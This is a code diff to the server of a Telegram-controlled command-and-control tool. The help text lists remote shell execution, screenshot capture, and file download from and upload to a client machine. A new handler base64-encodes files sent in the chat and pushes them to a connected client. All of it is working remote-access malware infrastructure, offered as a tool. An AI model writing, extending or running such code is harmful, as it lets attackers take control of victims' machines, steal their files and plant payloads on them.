@@ -128,10 +128,13 @@ class C2Server:
                 "ℹ️ *Client commands:*\n"
                 "- `/delete` - Delete topic\n"
                 "- `/status` - Check if the client is online\n"
-                "- `/shell <command>` - Execute command in the client\n"
-                "- `/screenshot` - Take a screenshot and send it here\n"
+                "- `/shell <command>` - Execute command in the client\n\n"
+                "🖥️ *Screen Commands:*🖥️\n"
+                "- `/screenshot` - Take a screenshot and send it here\n\n"
+                "📂 *Files Commands:* 📂\n"
                 "- `/download <file_path>` - Download a file from the client\n"
-                "- `/upload <file_path>` - Upload a file to the client\n"
+                "- `/upload <file_path>` - Upload a file from the server to the client\n"
+                "- `Also you can send a file directly in the chat to the client`"
             )
 
             ip_info = self.get_info_ip(session.ip)
@@ -192,7 +195,7 @@ class C2Server:
             self.send_command_to_client(self.clients[client_ip], f"download {file}", message.message_thread_id)
 
         elif text.startswith("/upload"):
-            bot.send_message(C2_CHANNEL_ID, "📁 File uploading...", message_thread_id=message.message_thread_id)
+            bot.send_message(C2_CHANNEL_ID, "📁 Uploading file...", message_thread_id=message.message_thread_id)
             self.send_file(self.clients[client_ip], text.replace("/upload ", ""), message.message_thread_id)
 
     def handle_global_command(self, message):
@@ -386,6 +389,43 @@ class C2Server:
             session.close()
         bot.stop_polling()
         exit(0)
+
+@bot.message_handler(content_types=['document'])
+def handle_document(message):
+    bot.send_message(C2_CHANNEL_ID, "📁 Uploading File...", message_thread_id=message.message_thread_id)
+    if not message.message_thread_id:
+        bot.reply_to(message, "❌ Este archivo debe mandarse dentro de un hilo de cliente.")
+        return
+
+    try:
+        file_info = bot.get_file(message.document.file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+        file_data_b64 = base64.b64encode(downloaded_file).decode()
+        file_name = message.document.file_name
+
+        conn = sqlite3.connect("c2.db")
+        cursor = conn.cursor()
+        cursor.execute("SELECT ip FROM clients WHERE topic_id = ?", (message.message_thread_id,))
+        result = cursor.fetchone()
+        conn.close()
+
+        if not result:
+            bot.reply_to(message, "❌ No se encontró el cliente para este hilo.")
+            return
+
+        client_ip = result[0]
+        session = c2.clients.get(client_ip)
+
+        if not session:
+            bot.reply_to(message, "❌ Cliente no conectado.")
+            return
+
+        command = f"upload {file_data_b64} {file_name}"
+        c2.send_command_to_client(session, command, message.message_thread_id)
+
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error procesando el archivo: {e}")
+
 
 if __name__ == "__main__":
     try:
